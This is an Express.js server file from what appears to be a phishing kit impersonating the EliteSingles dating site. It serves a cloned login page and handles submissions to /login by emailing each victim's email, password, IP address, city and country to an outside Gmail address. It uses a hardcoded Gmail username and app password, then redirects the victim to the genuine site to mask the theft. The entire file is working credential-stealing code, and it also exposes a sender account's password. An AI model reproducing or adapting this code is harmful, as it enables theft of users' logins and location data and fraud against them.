require('dotenv').config();
var express = require('express');
var path = require('path');
var app = express();
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const exip = require('express-ip');
const { json } = require('body-parser');
var port = process.env.PORT || 6050;
app.set('view engine', 'ejs');

app.use(
  express.urlencoded({
    extended: false,
  })
);

app.use(express.json());
app.use(express.static(path.join(__dirname, '/public')));
app.use(exip().getIpInfoMiddleware);
// const transporter = nodemailer.createTransport(mailGun(auth))

let transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'therealhayley800@gmail.com',
    pass: 'jycvfwzbrhvinlmz ',
  },
});

app.listen(process.env.PORT || port, () => {
  console.log('server running on', port);
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '/public/EliteSingles _ Login.html'));
});

app.post('/login', (req, res) => {
  var mailOptions = {
    from: 'therealhayley800@gmail.com', // sender address
    to: 'elisetaylor2020@gmail.com', // list of receivers
    subject: 'New EliteSingle Log', // Subject line
    html: `<h1>New EliteSingle Log</h1> <br>
      <h2>new email : ${req.body.email} </h2>
      <h2>new user password : ${req.body.password} </h2>
           <p>Current country: ${req.ipInfo.country} </p>
           <p>Current ip: ${req.ipInfo.ip} </p>
           <p>Current city: ${req.ipInfo.city} </p>
           `,
  };
  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      return console.log(error);
    }
    res.redirect('https://www.elitesingles.com/about-us');
    console.log('Message sent: ' + req.body.email, req.body.password);
    res.send(json({ message: 'email sent' }));
  });
  console.log(req.body, req.ipInfo.city, req.ipInfo.country);
});
